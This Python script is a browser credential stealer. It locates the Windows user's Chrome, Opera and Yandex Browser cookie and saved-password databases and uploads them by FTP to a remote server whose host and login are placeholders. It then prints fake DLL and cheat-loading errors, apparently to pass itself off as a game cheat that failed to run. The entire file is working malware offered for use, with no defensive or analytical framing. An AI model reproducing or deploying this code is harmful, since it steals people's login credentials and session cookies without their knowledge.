import os.path
import getpass
from ftplib import FTP
import random

con = FTP("хост","логин","пароль")

"""
Hack to directory
"""

UserName = '\\' + getpass.getuser()

dir_cookie_google = 'C:\\Users'+UserName+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'
dir_pass_google = "C:\\Users"+UserName+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
dir_cookie_yandex = "C:\\Users"+UserName+"\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies"
dir_pass_yandex = "C:\\Users"+UserName+"\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Password Checker"
dir_cookie_opera = "C:\\Users"+UserName+"\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies"
dir_pass_opera = "C:\\Users"+UserName+"\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"
dir_google = "C:\\Users"+UserName+"\\AppData\\Local\\Google\\Chrome\\User Data\\Safe Browsing Cookies"
dir_firefox = "C:\\Users"+UserName+"\\AppData\\Roaming\\Mozilla\\Firefox"
dir_yandex = "C:\\Users"+UserName+"\\AppData\\Local\\Yandex"
dir_opera = "C:\\Users"+UserName+"\\AppData\\Roaming\\Opera Software"

def check():
    if (os.path.exists(dir_google)) == True:
        filename = "google"+str(random.randint(1, 10000))
        filename2 = "google_pass" + str(random.randint(1, 10000))
        with open(dir_cookie_google, "rb") as content:
            con.storbinary("STOR %s" % filename, content)
        with open(dir_pass_google, "rb") as content:
            con.storbinary("STOR %s" % filename2, content)
    if (os.path.exists(dir_opera)) == True:
        filename = "opera"+str(random.randint(1, 10000))
        filename2 = "opera_pass" + str(random.randint(1, 10000))
        with open(dir_cookie_opera, "rb") as content:
            con.storbinary("STOR %s" % filename, content)
        with open(dir_pass_opera, "rb") as content:
            con.storbinary("STOR %s" % filename2, content)
    if (os.path.exists(dir_yandex)) == True:
        filename = "yandex"+str(random.randint(1, 10000))
        filename2 = "yandex_pass" + str(random.randint(1, 10000))
        with open(dir_cookie_yandex, "rb") as content:
            con.storbinary("STOR %s" % filename, content)
        with open(dir_pass_yandex, "rb") as content:
            con.storbinary("STOR %s" % filename2, content)

check()
print("Error library import HOUII.dll")
print("Error RUN cheat")
input()
